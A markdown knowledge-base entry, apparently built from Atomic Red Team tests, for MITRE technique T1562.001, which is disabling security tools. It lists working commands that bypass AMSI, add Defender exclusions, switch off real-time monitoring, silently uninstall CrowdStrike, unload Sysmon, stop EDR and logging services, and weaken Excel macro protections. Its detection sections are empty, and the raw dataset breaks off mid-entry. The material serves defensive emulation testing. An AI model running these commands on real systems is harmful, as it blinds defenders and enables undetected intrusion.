@@ -1,0 +1,1739 @@
+
+# Disable or Modify Tools
+
+## Description
+
+### MITRE Description
+
+> Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information.
+
+## Aliases
+
+```
+
+```
+
+## Additional Attributes
+
+* Bypass: ['Anti-virus', 'Log analysis', 'Signature-based detection', 'Host intrusion prevention systems', 'File monitoring']
+* Effective Permissions: None
+* Network: None
+* Permissions: ['User', 'Administrator']
+* Platforms: ['Windows', 'macOS', 'Linux']
+* Remote: None
+* Type: attack-pattern
+* Wiki: https://attack.mitre.org/techniques/T1562/001
+
+## Potential Commands
+
+```
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+$excludedProcess = "outlook.exe"
+Add-MpPreference -ExclusionProcess $excludedProcess
+sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
+New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel"
+New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security"
+New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -Value "1" -PropertyType "Dword"
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableInternetFilesInPV" -Value "1" -PropertyType "Dword"
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType "Dword"
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableAttachementsInPV" -Value "1" -PropertyType "Dword"
+if (Test-Path "C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe") {. "C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe" /repair /uninstall /quiet } else { Get-ChildItem -Path "C:\ProgramData\Package Cache" -Include "WindowsSensor.exe" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq "Valid" -and $sig.SignerCertificate.DnsNameList -eq "CrowdStrike, Inc.") { . "$_" /repair /uninstall /quiet; break;}}}
+setenforce 0
+$excludedExts= ".exe"
+Add-MpPreference -ExclusionExtension  $excludedExts
+sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.falcond.plist
+sudo launchctl unload #{userdaemon_plist}
+fltmc.exe unload SysmonDrv
+net.exe stop McAfeeDLPAgentService
+sc.exe config McAfeeDLPAgentService start= disabled
+Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
+sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
+Stop-Service -Name McAfeeDLPAgentService
+Remove-Service -Name McAfeeDLPAgentService
+sudo systemctl stop falcon-sensor.service
+sudo systemctl disable falcon-sensor.service
+sc stop WinDefend
+sc config WinDefend start=disabled
+sc query WinDefend
+if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
+then
+  service rsyslog stop
+  chkconfig off rsyslog
+else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
+  systemctl stop rsyslog
+  systemctl disable rsyslog
+fi
+sysmon -u
+Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
+"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+$excludedpath= "C:\Temp"
+Add-MpPreference -ExclusionPath $excludedpath
+Set-MpPreference -DisableRealtimeMonitoring 1
+Set-MpPreference -DisableBehaviorMonitoring 1
+Set-MpPreference -DisableScriptScanning 1
+Set-MpPreference -DisableBlockAtFirstSeen 1
+sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
+sudo launchctl unload #{falcond_plist}
+sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist
+if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
+then
+  service cbdaemon stop
+  chkconfig off cbdaemon
+else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
+  systemctl stop cbdaemon
+  systemctl disable cbdaemon
+fi
+```
+
+## Commands Dataset
+
+```
+[{'command': "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "
+             '"6" ];\n'
+             'then\n'
+             '  service rsyslog stop\n'
+             '  chkconfig off rsyslog\n'
+             "else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) "
+             '-eq "7" ];\n'
+             '  systemctl stop rsyslog\n'
+             '  systemctl disable rsyslog\n'
+             'fi\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "
+             '"6" ];\n'
+             'then\n'
+             '  service cbdaemon stop\n'
+             '  chkconfig off cbdaemon\n'
+             "else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) "
+             '-eq "7" ];\n'
+             '  systemctl stop cbdaemon\n'
+             '  systemctl disable cbdaemon\n'
+             'fi\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': 'setenforce 0\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': 'sudo systemctl stop falcon-sensor.service\n'
+             'sudo systemctl disable falcon-sensor.service\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': 'sudo launchctl unload '
+             '/Library/LaunchDaemons/com.carbonblack.daemon.plist\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': 'sudo launchctl unload '
+             '/Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': 'sudo launchctl unload '
+             '/Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': 'sudo launchctl unload '
+             '/Library/LaunchDaemons/com.crowdstrike.falcond.plist\n'
+             'sudo launchctl unload #{userdaemon_plist}\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': 'sudo launchctl unload #{falcond_plist}\n'
+             'sudo launchctl unload '
+             '/Library/LaunchDaemons/com.crowdstrike.userdaemon.plist\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': 'fltmc.exe unload SysmonDrv\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': 'sysmon -u\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n",
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': 'Remove-Item -Path '
+             '"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}" '
+             '-Recurse\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': 'net.exe stop McAfeeDLPAgentService\n'
+             'sc.exe config McAfeeDLPAgentService start= disabled\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': 'Set-MpPreference -DisableRealtimeMonitoring 1\n'
+             'Set-MpPreference -DisableBehaviorMonitoring 1\n'
+             'Set-MpPreference -DisableScriptScanning 1\n'
+             'Set-MpPreference -DisableBlockAtFirstSeen 1\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': 'sc stop WinDefend\n'
+             'sc config WinDefend start=disabled\n'
+             'sc query WinDefend\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': 'Set-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows '
+             'Defender" -Name DisableAntiSpyware -Value 1\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': 'New-Item -Path '
+             '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel"\n'
+             'New-Item -Path '
+             '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security"\n'
+             'New-Item -Path '
+             '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView"\n'
+             'New-ItemProperty -Path '
+             '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security" '
+             '-Name "VBAWarnings" -Value "1" -PropertyType "Dword"\n'
+             'New-ItemProperty -Path '
+             '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
+             '-Name "DisableInternetFilesInPV" -Value "1" -PropertyType '
+             '"Dword"\n'
+             'New-ItemProperty -Path '
+             '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
+             '-Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType '
+             '"Dword"\n'
+             'New-ItemProperty -Path '
+             '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
+             '-Name "DisableAttachementsInPV" -Value "1" -PropertyType '
+             '"Dword"\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': '"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" '
+             '-RemoveDefinitions -All\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': 'Stop-Service -Name McAfeeDLPAgentService\n'
+             'Remove-Service -Name McAfeeDLPAgentService\n',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': 'if (Test-Path "C:\\ProgramData\\Package '
+             'Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe") '
+             '{. "C:\\ProgramData\\Package '
+             'Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe" '
+             '/repair /uninstall /quiet } else { Get-ChildItem -Path '
+             '"C:\\ProgramData\\Package Cache" -Include "WindowsSensor.exe" '
+             '-Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath '
+             '$_.FullName); if ($sig.Status -eq "Valid" -and '
+             '$sig.SignerCertificate.DnsNameList -eq "CrowdStrike, Inc.") { . '
+             '"$_" /repair /uninstall /quiet; break;}}}',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': '$excludedpath= "C:\\Temp"\n'
+             'Add-MpPreference -ExclusionPath $excludedpath',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': '$excludedExts= ".exe"\n'
+             'Add-MpPreference -ExclusionExtension  $excludedExts',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'},
+ {'command': '$excludedProcess = "outlook.exe"\n'
+             'Add-MpPreference -ExclusionProcess $excludedProcess',
+  'name': None,
+  'source': 'atomics/T1562.001/T1562.001.yaml'}]
+```
+
+## Potential Detections
+
+```json
+
+```
+
+## Potential Queries
+
+```json
+
+```
+
+## Raw Dataset
+
+```json
+[{'Atomic Red Team Test - Impair Defenses: Disable or Modify Tools': {'atomic_tests': [{'auto_generated_guid': '4ce786f8-e601-44b5-bfae-9ebb15a7d1c8',
+                                                                                        'description': 'Disables '
+                                                                                                       'syslog '
+                                                                                                       'collection\n',
+                                                                                        'executor': {'command': 'if '
+                                                                                                                '[ '
+                                                                                                                '$(rpm '
+                                                                                                                '-q '
+                                                                                                                '--queryformat '
+                                                                                                                "'%{VERSION}' "
+                                                                                                                'centos-release) '
+                                                                                                                '-eq '
+                                                                                                                '"6" '
+                                                                                                                '];\n'
+                                                                                                                'then\n'
+                                                                                                                '  '
+                                                                                                                'service '
+                                                                                                                'rsyslog '
+                                                                                                                'stop\n'
+                                                                                                                '  '
+                                                                                                                'chkconfig '
+                                                                                                                'off '
+                                                                                                                'rsyslog\n'
+                                                                                                                'else '
+                                                                                                                'if '
+                                                                                                                '[ '
+                                                                                                                '$(rpm '
+                                                                                                                '-q '
+                                                                                                                '--queryformat '
+                                                                                                                "'%{VERSION}' "
+                                                                                                                'centos-release) '
+                                                                                                                '-eq '
+                                                                                                                '"7" '
+                                                                                                                '];\n'
+                                                                                                                '  '
+                                                                                                                'systemctl '
+                                                                                                                'stop '
+                                                                                                                'rsyslog\n'
+                                                                                                                '  '
+                                                                                                                'systemctl '
+                                                                                                                'disable '
+                                                                                                                'rsyslog\n'
+                                                                                                                'fi\n',
+                                                                                                     'name': 'sh'},
+                                                                                        'name': 'Disable '
+                                                                                                'syslog',
+                                                                                        'supported_platforms': ['linux']},
+                                                                                       {'auto_generated_guid': 'ae8943f7-0f8d-44de-962d-fbc2e2f03eb8',
+                                                                                        'description': 'Disable '
+                                                                                                       'the '
+                                                                                                       'Cb '
+                                                                                                       'Response '
+                                                                                                       'service\n',
+                                                                                        'executor': {'command': 'if '
+                                                                                                                '[ '
+                                                                                                                '$(rpm '
+                                                                                                                '-q '
+                                                                                                                '--queryformat '
+                                                                                                                "'%{VERSION}' "
+                                                                                                                'centos-release) '
+                                                                                                                '-eq '
+                                                                                                                '"6" '
+                                                                                                                '];\n'
+                                                                                                                'then\n'
+                                                                                                                '  '
+                                                                                                                'service '
+                                                                                                                'cbdaemon '
+                                                                                                                'stop\n'
+                                                                                                                '  '
+                                                                                                                'chkconfig '
+                                                                                                                'off '
+                                                                                                                'cbdaemon\n'
+                                                                                                                'else '
+                                                                                                                'if '
+                                                                                                                '[ '
+                                                                                                                '$(rpm '
+                                                                                                                '-q '
+                                                                                                                '--queryformat '
+                                                                                                                "'%{VERSION}' "
+                                                                                                                'centos-release) '
+                                                                                                                '-eq '
+                                                                                                                '"7" '
+                                                                                                                '];\n'
+                                                                                                                '  '
+                                                                                                                'systemctl '
+                                                                                                                'stop '
+                                                                                                                'cbdaemon\n'
+                                                                                                                '  '
+                                                                                                                'systemctl '
+                                                                                                                'disable '
+                                                                                                                'cbdaemon\n'
+                                                                                                                'fi\n',
+                                                                                                     'name': 'sh'},
+                                                                                        'name': 'Disable '
+                                                                                                'Cb '
+                                                                                                'Response',
+                                                                                        'supported_platforms': ['linux']},
+                                                                                       {'auto_generated_guid': 'fc225f36-9279-4c39-b3f9-5141ab74f8d8',
+                                                                                        'description': 'Disables '
+                                                                                                       'SELinux '
+                                                                                                       'enforcement\n',
+                                                                                        'executor': {'command': 'setenforce '
+                                                                                                                '0\n',
+                                                                                                     'name': 'sh'},
+                                                                                        'name': 'Disable '
+                                                                                                'SELinux',
+                                                                                        'supported_platforms': ['linux']},
+                                                                                       {'auto_generated_guid': '828a1278-81cc-4802-96ab-188bf29ca77d',
+                                                                                        'description': 'Stop '
+                                                                                                       'and '
+                                                                                                       'disable '
+                                                                                                       'Crowdstrike '
+                                                                                                       'Falcon '
+                                                                                                       'on '
+                                                                                                       'Linux\n',
+                                                                                        'executor': {'cleanup_command': 'sudo '
+                                                                                                                        'systemctl '
+                                                                                                                        'enable '
+                                                                                                                        'falcon-sensor.service\n'
+                                                                                                                        'sudo '
+                                                                                                                        'systemctl '
+                                                                                                                        'start '
+                                                                                                                        'falcon-sensor.service\n',
+                                                                                                     'command': 'sudo '
+                                                                                                                'systemctl '
+                                                                                                                'stop '
+                                                                                                                'falcon-sensor.service\n'
+                                                                                                                'sudo '
+                                                                                                                'systemctl '
+                                                                                                                'disable '
+                                                                                                                'falcon-sensor.service\n',
+                                                                                                     'elevation_required': True,
+                                                                                                     'name': 'sh'},
+                                                                                        'name': 'Stop '
+                                                                                                'Crowdstrike '
+                                                                                                'Falcon '
+                                                                                                'on '
+                                                                                                'Linux',
+                                                                                        'supported_platforms': ['linux']},
+                                                                                       {'auto_generated_guid': '8fba7766-2d11-4b4a-979a-1e3d9cc9a88c',
+                                                                                        'description': 'Disables '
+                                                                                                       'Carbon '
+                                                                                                       'Black '
+                                                                                                       'Response\n',
+                                                                                        'executor': {'command': 'sudo '
+                                                                                                                'launchctl '
+                                                                                                                'unload '
+                                                                                                                '/Library/LaunchDaemons/com.carbonblack.daemon.plist\n',
+                                                                                                     'name': 'sh'},
+                                                                                        'name': 'Disable '
+                                                                                                'Carbon '
+                                                                                                'Black '
+                                                                                                'Response',
+                                                                                        'supported_platforms': ['macos']},
+                                                                                       {'auto_generated_guid': '62155dd8-bb3d-4f32-b31c-6532ff3ac6a3',
+                                                                                        'description': 'Disables '
+                                                                                                       'LittleSnitch\n',
+                                                                                        'executor': {'command': 'sudo '
+                                                                                                                'launchctl '
+                                                                                                                'unload '
+                                                                                                                '/Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n',
+                                                                                                     'name': 'sh'},
+                                                                                        'name': 'Disable '
+                                                                                                'LittleSnitch',
+                                                                                        'supported_platforms': ['macos']},
+                                                                                       {'auto_generated_guid': '07f43b33-1e15-4e99-be70-bc094157c849',
+                                                                                        'description': 'Disables '
+                                                                                                       'OpenDNS '
+                                                                                                       'Umbrella\n',
+                                                                                        'executor': {'command': 'sudo '
+                                                                                                                'launchctl '
+                                                                                                                'unload '
+                                                                                                                '/Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n',
+                                                                                                     'name': 'sh'},
+                                                                                        'name': 'Disable '
+                                                                                                'OpenDNS '
+                                                                                                'Umbrella',
+                                                                                        'supported_platforms': ['macos']},
+                                                                                       {'auto_generated_guid': 'b3e7510c-2d4c-4249-a33f-591a2bc83eef',
+                                                                                        'description': 'Stop '
+                                                                                                       'and '
+                                                                                                       'unload '
+                                                                                                       'Crowdstrike '
+                                                                                                       'Falcon '
+                                                                                                       'daemons '
+                                                                                                       'falcond '
+                                                                                                       'and '
+                                                                                                       'userdaemon '
+                                                                                                       'on '
+                                                                                                       'macOS\n',
+                                                                                        'executor': {'command': 'sudo '
+                                                                                                                'launchctl '
+                                                                                                                'unload '
+                                                                                                                '#{falcond_plist}\n'
+                                                                                                                'sudo '
+                                                                                                                'launchctl '
+                                                                                                                'unload '
+                                                                                                                '#{userdaemon_plist}\n',
+                                                                                                     'elevation_required': True,
+                                                                                                     'name': 'sh'},
+                                                                                        'input_arguments': {'falcond_plist': {'default': '/Library/LaunchDaemons/com.crowdstrike.falcond.plist',
+                                                                                                                              'description': 'The '
+                                                                                                                                             'path '
+                                                                                                                                             'of '
+                                                                                                                                             'the '
+                                                                                                                                             'Crowdstrike '
+                                                                                                                                             'Falcon '
+                                                                                                                                             'plist '
+                                                                                                                                             'file',
+                                                                                                                              'type': 'path'},
+                                                                                                            'userdaemon_plist': {'default': '/Library/LaunchDaemons/com.crowdstrike.userdaemon.plist',
+                                                                                                                                 'description': 'The '
+                                                                                                                                                'path '
+                                                                                                                                                'of '
+                                                                                                                                                'the '
+                                                                                                                                                'Crowdstrike '
+                                                                                                                                                'Userdaemon '
+                                                                                                                                                'plist '
+                                                                                                                                                'file',
+                                                                                                                                 'type': 'path'}},
+                                                                                        'name': 'Stop '
+                                                                                                'and '
+                                                                                                'unload '
+                                                                                                'Crowdstrike '
+                                                                                                'Falcon '
+                                                                                                'on '
+                                                                                                'macOS',
+                                                                                        'supported_platforms': ['macos']},
+                                                                                       {'auto_generated_guid': '811b3e76-c41b-430c-ac0d-e2380bfaa164',
+                                                                                        'dependencies': [{'description': 'Sysmon '
+                                                                                                                         'must '
+                                                                                                                         'be '
+                                                                                                                         'downloaded\n',
+                                                                                                          'get_prereq_command': 'Invoke-WebRequest '
+                                                                                                                                '"https://download.sysinternals.com/files/Sysmon.zip" '
+                                                                                                                                '-OutFile '
+                                                                                                                                '"$env:TEMP\\Sysmon.zip"\n'
+                                                                                                                                'Expand-Archive '
+                                                                                                                                '$env:TEMP\\Sysmon.zip '
+                                                                                                                                '$env:TEMP\\Sysmon '
+                                                                                                                                '-Force\n'
+                                                                                                                                'Remove-Item '
+                                                                                                                                '$env:TEMP\\Sysmon.zip '
+                                                                                                                                '-Force\n',
+                                                                                                          'prereq_command': 'if '
+                                                                                                                            '((cmd.exe '
+                                                                                                                            '/c '
+                                                                                                                            '"where.exe '
+                                                                                                                            'Sysmon.exe '
+                                                                                                                            '2> '
+                                                                                                                            'nul '
+                                                                                                                            '| '
+                                                                                                                            'findstr '
+                                                                                                                            'Sysmon '
+                                                                                                                            '2> '
+                                                                                                                            'nul") '
+                                                                                                                            '-or '
+                                                                                                                            '(Test-Path '
+                                                                                                                            '$env:Temp\\Sysmon\\Sysmon.exe)) '
+                                                                                                                            '{ '
+                                                                                                                            'exit '
+                                                                                                                            '0 '
+                                                                                                                            '} '
+                                                                                                                            'else '
+                                                                                                                            '{ '
+                                                                                                                            'exit '
+                                                                                                                            '1 '
+                                                                                                                            '}\n'},
+                                                                                                         {'description': 'sysmon '
+                                                                                                                         'must '
+                                                                                                                         'be '
+                                                                                                                         'Installed\n',
+                                                                                                          'get_prereq_command': 'if(cmd.exe '
+                                                                                                                                '/c '
+                                                                                                                                '"where.exe '
+                                                                                                                                'Sysmon.exe '
+                                                                                                                                '2> '
+                                                                                                                                'nul '
+                                                                                                                                '| '
+                                                                                                                                'findstr '
+                                                                                                                                'Sysmon '
+                                                                                                                                '2> '
+                                                                                                                                'nul") '
+                                                                                                                                '{ '
+                                                                                                                                'C:\\Windows\\Sysmon.exe '
+                                                                                                                                '-accepteula '
+                                                                                                                                '-i '
+                                                                                                                                '} '
+                                                                                                                                'else\n'
+                                                                                                                                '{ '
+                                                                                                                                'Set-Location '
+                                                                                                                                '$env:TEMP\\Sysmon\\; '
+                                                                                                                                '.\\Sysmon.exe '
+                                                                                                                                '-accepteula '
+                                                                                                                                '-i}\n',
+                                                                                                          'prereq_command': 'if(sc.exe '
+                                                                                                                            'query '
+                                                                                                                            'sysmon '
+                                                                                                                            '| '
+                                                                                                                            'findstr '
+                                                                                                                            'sysmon) '
+                                                                                                                            '{ '
+                                                                                                                            'exit '
+                                                                                                                            '0 '
+                                                                                                                            '} '
+                                                                                                                            'else '
+                                                                                                                            '{ '
+                                                                                                                            'exit '
+                                                                                                                            '1 '
+                                                                                                                            '}\n'},
+                                                                                                         {'description': 'sysmon '
+                                                                                                                         'filter '
+                                                                                                                         'must '
+                                                                                                                         'be '
+                                                                                                                         'loaded\n',
+                                                                                                          'get_prereq_command': 'sysmon '
+                                                                                                                                '-u\n'
+                                                                                                                                'sysmon '
+                                                                                                                                '-accepteula '
+                                                                                                                                '-i\n',
+                                                                                                          'prereq_command': 'if(fltmc.exe '
+                                                                                                                            'filters '
+                                                                                                                            '| '
+                                                                                                                            'findstr '
+                                                                                                                            '#{sysmon_driver}) '
+                                                                                                                            '{ '
+                                                                                                                            'exit '
+                                                                                                                            '0 '
+                                                                                                                            '} '
+                                                                                                                            'else '
+                                                                                                                            '{ '
+                                                                                                                            'exit '
+                                                                                                                            '1 '
+                                                                                                                            '}\n'}],
+                                                                                        'dependency_executor_name': 'powershell',
+                                                                                        'description': 'Unloads '
+                                                                                                       'the '
+                                                                                                       'Sysinternals '
+                                                                                                       'Sysmon '
+                                                                                                       'filter '
+                                                                                                       'driver '
+                                                                                                       'without '
+                                                                                                       'stopping '
+                                                                                                       'the '
+                                                                                                       'Sysmon '
+                                                                                                       'service. '
+                                                                                                       'To '
+                                                                                                       'verify '
+                                                                                                       'successful '
+                                                                                                       'execution, '
+                                                                                                       'o '
+                                                                                                       'verify '
+                                                                                                       'successful '
+                                                                                                       'execution,\n'
+                                                                                                       'run '
+                                                                                                       'the '
+                                                                                                       "prereq_command's "
+                                                                                                       'and '
+                                                                                                       'it '
+                                                                                                       'should '
+                                                                                                       'fail '
+                                                                                                       'with '
+                                                                                                       'an '
+                                                                                                       'error '
+                                                                                                       'of '
+                                                                                                       '"sysmon '
+                                                                                                       'filter '
+                                                                                                       'must '
+                                                                                                       'be '
+                                                                                                       'loaded".\n',
+                                                                                        'executor': {'cleanup_command': 'sysmon '
+                                                                                                                        '-u '
+                                                                                                                        '-i '
+                                                                                                                        '> '
+                                                                                                                        'nul '
+                                                                                                                        '2>&1\n'
+                                                                                                                        'sysmon '
+                                                                                                                        '-i '
+                                                                                                                        '-accepteula '
+                                                                                                                        '-i '
+                                                                                                                        '> '
+                                                                                                                        'nul '
+                                                                                                                        '2>&1\n'
+                                                                                                                        '%temp%\\Sysmon\\sysmon.exe '
+                                                                                                                        '-u '
+                                                                                                                        '> '
+                                                                                                                        'nul '
+                                                                                                                        '2>&1\n'
+                                                                                                                        '%temp%\\Sysmon\\sysmon.exe '
+                                                                                                                        '-accepteula '
+                                                                                                                        '-i '
+                                                                                                                        '> '
+                                                                                                                        'nul '
+                                                                                                                        '2>&1\n',
+                                                                                                     'command': 'fltmc.exe '
+                                                                                                                'unload '
+                                                                                                                '#{sysmon_driver}\n',
+                                                                                                     'elevation_required': True,
+                                                                                                     'name': 'command_prompt'},
+                                                                                        'input_arguments': {'sysmon_driver': {'default': 'SysmonDrv',
+                                                                                                                              'description': 'The '
+                                                                                                                                             'name '
+                                                                                                                                             'of '
+                                                                                                                                             'the '
+                                                                                                                                             'Sysmon '
+                                                                                                                                             'filter '
+                                                                                                                                             'driver '
+                                                                                                                                             '(this '
+                                                                                                                                             'can '
+                                                                                                                                             'change '
+                                                                                                                                             'from '
+                                                                                                                                             'the '
+                                                                                                                                             'default)',
+                                                                                                                              'type': 'string'}},
+                                                                                        'name': 'Unload '
+                                                                                                'Sysmon '
+                                                                                                'Filter '
+                                                                                                'Driver',
+                                                                                        'supported_platforms': ['windows']},
+                                                                                       {'auto_generated_guid': 'a316fb2e-5344-470d-91c1-23e15c374edc',
+                                                                                        'dependencies': [{'description': 'Sysmon '
+                                                                                                                         'executable '
+                                                                                                                         'must '
+                                                                                                                         'be '
+                                                                                                                         'available\n',
+                                                                                                          'get_prereq_command': '$parentpath '
+                                                                                                                                '= '
+                                                                                                                                'Split-Path '
+                                                                                                                                '"#{sysmon_exe}"; '
+                                                                                                                                '$zippath '
+                                                                                                                                '= '
+                                                                                                                                '"$parentpath\\Sysmon.zip"\n'
+                                                                                                                                'New-Item '
+                                                                                                                                '-ItemType '
+                                                                                                                                'Directory '
+                                                                                                                                '$parentpath '
+                                                                                                                                '-Force '
+                                                                                                                                '| '
+                                                                                                                                'Out-Null\n'
+                                                                                                                                'Invoke-WebRequest '
+                                                                                                                                '"https://download.sysinternals.com/files/Sysmon.zip" '
+                                                                                                                                '-OutFile '
+                                                                                                                                '"$zippath"\n'
+                                                                                                                                'Expand-Archive '
+                                                                                                                                '$zippath '
+                                                                                                                                '$parentpath '
+                                                                                                                                '-Force; '
+                                                                                                                                'Remove-Item '
+                                                                                                                                '$zippath\n'
+                                                                                                                                'if(-not '
+                                                                                                                                '($Env:Path).contains($parentpath)){$Env:Path '
+                                                                                                                                '+= '
+                                                                                                                                '";$parentpath"}\n',
+                                                                                                          'prereq_command': 'if(cmd '
+                                                                                                                            '/c '
+                                                                                                                            'where '
+                                                                                                                            'sysmon) '
+                                                                                                                            '{exit '
+                                                                                                                            '0} '
+                                                                                                                            'else '
+                                                                                                                            '{exit '
+                                                                                                                            '1}\n'},
+                                                                                                         {'description': 'Sysmon '
+                                                                                                                         'must '
+                                                                                                                         'be '
+                                                                                                                         'installed\n',
+                                                                                                          'get_prereq_command': 'cmd '
+                                                                                                                                '/c '
+                                                                                                                                'sysmon '
+                                                                                                                                '-i '
+                                                                                                                                '-accepteula\n',
+                                                                                                          'prereq_command': 'if(cmd '
+                                                                                                                            '/c '
+                                                                                                                            'sc '
+                                                                                                                            'query '
+                                                                                                                            'sysmon) '
+                                                                                                                            '{ '
+                                                                                                                            'exit '
+                                                                                                                            '0} '
+                                                                                                                            'else '
+                                                                                                                            '{ '
+                                                                                                                            'exit '
+                                                                                                                            '1}\n'}],
+                                                                                        'dependency_executor_name': 'powershell',
+                                                                                        'description': 'Uninstall '
+                                                                                                       'Sysinternals '
+                                                                                                       'Sysmon '
+                                                                                                       'for '
+                                                                                                       'Defense '
+                                                                                                       'Evasion\n',
+                                                                                        'executor': {'cleanup_command': 'sysmon '
+                                                                                                                        '-i '
+                                                                                                                        '-accepteula '
+                                                                                                                        '>nul '
+                                                                                                                        '2>&1\n',
+                                                                                                     'command': 'sysmon '
+                                                                                                                '-u\n',
+                                                                                                     'elevation_required': True,
+                                                                                                     'name': 'command_prompt'},
+                                                                                        'input_arguments': {'sysmon_exe': {'default': 'PathToAtomicsFolder\\T1562.001\\bin\\sysmon.exe',
+                                                                                                                           'description': 'The '
+                                                                                                                                          'location '
+                                                                                                                                          'of '
+                                                                                                                                          'the '
+                                                                                                                                          'Sysmon '
+                                                                                                                                          'executable '
+                                                                                                                                          'from '
+                                                                                                                                          'Sysinternals '
+                                                                                                                                          '(ignored '
+                                                                                                                                          'if '
+                                                                                                                                          'sysmon.exe '
+                                                                                                                                          'is '
+                                                                                                                                          'found '
+                                                                                                                                          'in '
+                                                                                                                                          'your '
+                                                                                                                                          'PATH)',
+                                                                                                                           'type': 'Path'}},
+                                                                                        'name': 'Uninstall '
+                                                                                                'Sysmon',
+                                                                                        'supported_platforms': ['windows']},
+                                                                                       {'auto_generated_guid': '695eed40-e949-40e5-b306-b4031e4154bd',
+                                                                                        'description': 'Any '
+                                                                                                       'easy '
+                                                                                                       'way '
+                                                                                                       'to '
